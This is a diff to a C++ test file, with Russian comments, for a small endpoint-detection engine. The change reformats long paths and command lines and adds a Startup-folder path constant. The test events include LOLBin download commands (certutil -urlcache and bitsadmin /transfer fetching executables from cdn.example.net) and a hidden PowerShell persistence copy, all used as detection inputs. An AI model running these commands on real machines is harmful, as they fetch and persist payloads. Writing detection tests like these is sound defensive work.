@@ -60,6 +60,13 @@ Event FileEvent(const std::string& type, const std::string& key,
     return Make("1730900000000", type, "7000", {{key, path}});
 }
 
+// Путь автозагрузки Windows целиком: он длинный, повторяется в четырёх
+// случаях ниже, и в нём важен каждый сегмент — правило обязано смотреть
+// на канонический \start menu\programs\startup\, а не на \startup\.
+const char kStartupLnk[] =
+    R"(C:\Users\max\AppData\Roaming\Microsoft\Windows\Start Menu)"
+    R"(\Programs\Startup\Sync.lnk)";
+
 // Правило ищется по идентификатору: порядок в таблице ваш.
 const nano_edr::Rule* FindRule(const std::string& id) {
     const nano_edr::Rule* rules = AgentRules();
@@ -91,7 +98,8 @@ Event WordStartupWrite() {
     return Make(
         "1730000002100", "file_write", "880",
         {{"path",
-          R"(C:\Users\max\AppData\Roaming\Microsoft\Word\STARTUP\~$report.docx)"},
+          R"(C:\Users\max\AppData\Roaming\Microsoft\Word\STARTUP)"
+          R"(\~$report.docx)"},
          {"size", "162"}});
 }
 
@@ -113,7 +121,8 @@ Event CmdRunningCertutil() {
         {{"ppid", "880"},
          {"image", R"(C:\Windows\System32\cmd.exe)"},
          {"cmdline",
-          R"(cmd /c certutil -urlcache -split -f http://cdn.example.net/upd.txt %TEMP%\upd.exe)"},
+          R"(cmd /c certutil -urlcache -split -f )"
+          R"(http://cdn.example.net/upd.txt %TEMP%\upd.exe)"},
          {"user", R"(DESKTOP\max)"}});
 }
 
@@ -136,7 +145,8 @@ std::vector<Event> PhishingMacro() {
     return {
         Make("1730000000500", "file_write", "1300",
              {{"path",
-               R"(C:\Users\max\AppData\Local\Google\Chrome\User Data\Default\History)"},
+               R"(C:\Users\max\AppData\Local\Google\Chrome\User )"
+               R"(Data\Default\History)"},
               {"size", "204800"}}),
         CmdRunningWscript(),
         Make("1730000001400", "file_create", "1042",
@@ -171,7 +181,8 @@ std::vector<Event> LolbinDownload() {
              {{"ppid", "3310"},
               {"image", R"(C:\Windows\System32\certutil.exe)"},
               {"cmdline",
-               R"(certutil -urlcache -split -f http://cdn.example.net/upd.txt C:\Users\max\AppData\Local\Temp\upd.exe)"}}),
+               R"(certutil -urlcache -split -f http://cdn.example.net/upd.txt )"
+               R"(C:\Users\max\AppData\Local\Temp\upd.exe)"}}),
         Make("1730200000900", "net_connect", "3315",
              {{"raddr", "91.204.11.7"},
               {"rport", "80"},
@@ -188,16 +199,17 @@ std::vector<Event> Persistence() {
               {"image",
                R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)"},
               {"cmdline",
-               R"(powershell -w hidden -c Copy-Item $env:TEMP\s.bin $env:APPDATA\Sync\sync.exe)"},
+               R"(powershell -w hidden -c Copy-Item $env:TEMP\s.bin )"
+               R"($env:APPDATA\Sync\sync.exe)"},
               {"user", R"(DESKTOP\max)"}}),
         Make("1730300000600", "file_create", "4410",
              {{"path", R"(C:\Users\max\AppData\Roaming\Sync\sync.exe)"}}),
         Make("1730300001600", "file_create", "4410",
              {{"path",
-               R"(C:\Users\max\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Sync.lnk)"}}),
+               kStartupLnk}}),
         Make("1730300001900", "file_write", "4410",
              {{"path",
-               R"(C:\Users\max\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Sync.lnk)"},
+               kStartupLnk},
               {"size", "1246"}}),
         Make("1730300003000", "process_start", "4455",
              {{"ppid", "880"},
@@ -259,12 +271,14 @@ std::vector<Event> CleanOffice() {
              {{"path", R"(C:\Users\max\report.docx)"}, {"size", "21504"}}),
         Make("1730500000400", "file_write", "1500",
              {{"path",
-               R"(C:\Users\max\AppData\Roaming\Microsoft\Word\AutoRecovery save of report.asd)"},
+               R"(C:\Users\max\AppData\Roaming\Microsoft\Word\AutoRecovery )"
+               R"(save of report.asd)"},
               {"size", "20480"}}),
         WscriptFromCorpTools(),
         Make("1730500003520", "file_create", "1300",
              {{"path",
-               R"(C:\Users\max\AppData\Local\Google\Chrome\User Data\Default\Cache\data_1)"}}),
+               R"(C:\Users\max\AppData\Local\Google\Chrome\User )"
+               R"(Data\Default\Cache\data_1)"}}),
         Make("1730500009800", "file_move", "880",
              {{"from", R"(C:\Users\max\report.docx)"},
               {"to", R"(C:\Users\max\report_final.docx)"}}),
@@ -276,9 +290,12 @@ std::vector<Event> CleanBuild() {
         Make("1730600000800", "process_start", "5600",
              {{"ppid", "5520"},
               {"image",
-               R"(C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44\bin\Hostx64\x64\cl.exe)"},
+               R"(C:\Program Files\Microsoft Visual )"
+               R"(Studio\2022\Community\VC\Tools\MSVC\14.44\bin\Hostx64\x64\)"
+               R"(cl.exe)"},
               {"cmdline",
-               R"(cl.exe /c /std:c++latest src\api.cpp /FoC:\work\nano-edr\build\obj\api.obj.tmp)"}}),
+               R"(cl.exe /c /std:c++latest src\api.cpp )"
+               R"(/FoC:\work\nano-edr\build\obj\api.obj.tmp)"}}),
         Make("1730600000840", "file_create", "5600",
              {{"path", R"(C:\work\nano-edr\build\obj\api.obj.tmp)"}}),
         Make("1730600000880", "file_write", "5600",
@@ -414,7 +431,8 @@ TEST_CASE("скриптовый хост без командной строки 
 TEST_CASE("загрузка: bitsadmin с transfer") {
     CHECK(Detects(ProcessStart(
               R"(C:\Windows\System32\bitsadmin.exe)",
-              R"(bitsadmin /transfer job http://cdn.example.net/y.exe C:\Users\max\AppData\Local\Temp\y.exe)")) ==
+              R"(bitsadmin /transfer job http://cdn.example.net/y.exe )"
+              R"(C:\Users\max\AppData\Local\Temp\y.exe)")) ==
           1);
 }
 
@@ -441,7 +459,7 @@ TEST_CASE("автозапуск: переименование в Startup вид�
         "1730900000000", "file_move", "7000",
         {{"from", R"(C:\Users\max\AppData\Local\Temp\Sync.lnk)"},
          {"to",
-          R"(C:\Users\max\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Sync.lnk)"}});
+          kStartupLnk}});
 
     CHECK(Detects(event) == 1);
 }
@@ -449,7 +467,7 @@ TEST_CASE("автозапуск: переименование в Startup вид�
 TEST_CASE("автозапуск: удаление из Startup — не запись") {
     CHECK(Detects(FileEvent(
               "file_delete", "path",
-              R"(C:\Users\max\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Sync.lnk)")) ==
+              kStartupLnk)) ==
           0);
 }
 
@@ -480,7 +498,8 @@ TEST_CASE("старт процесса без image обрывает прого�
     // и GetRequiredField бросает. Исключение проходит сквозь CheckRules
     // наружу — ловит его последний рубеж в main.
     const Event event = Make("1730900000000", "process_start", "7000",
-                             {{"ppid", "880"}, {"cmdline", "wscript.exe a.js"}});
+                             {{"ppid", "880"},
+                              {"cmdline", "wscript.exe a.js"}});
 
     CHECK_THROWS_AS(Detects(event), std::invalid_argument);
 }
